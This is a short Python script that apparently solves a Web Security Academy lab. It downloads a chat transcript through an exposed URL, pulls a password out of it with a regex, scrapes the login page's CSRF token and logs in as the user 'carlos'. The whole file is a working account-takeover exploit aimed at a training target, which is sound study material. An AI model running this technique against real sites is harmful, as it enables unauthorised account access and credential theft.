import requests
import re
from bs4 import BeautifulSoup

url = "https://acc31f101edfcb50c046214b00860005.web-security-academy.net" 
def get_pass(url):
	p = requests.get(url + "/download-transcript/1.txt")
	
	passwd = re.findall("is \w+.", p.text)
	return passwd[0][3:-1]

def slove(url):
	s = requests.session()
	r = s.get(url+ "/login")
	soup = BeautifulSoup(r.text, "html.parser")
	for i in soup.find_all('input'):
		if i.get('name') == "csrf":
			token = i.get('value')
	data = {"csrf": token,"username": "carlos", "password": get_pass(url)}
	r = s.post(url + "/login", data=data)
	print(r.status_code)
slove(url)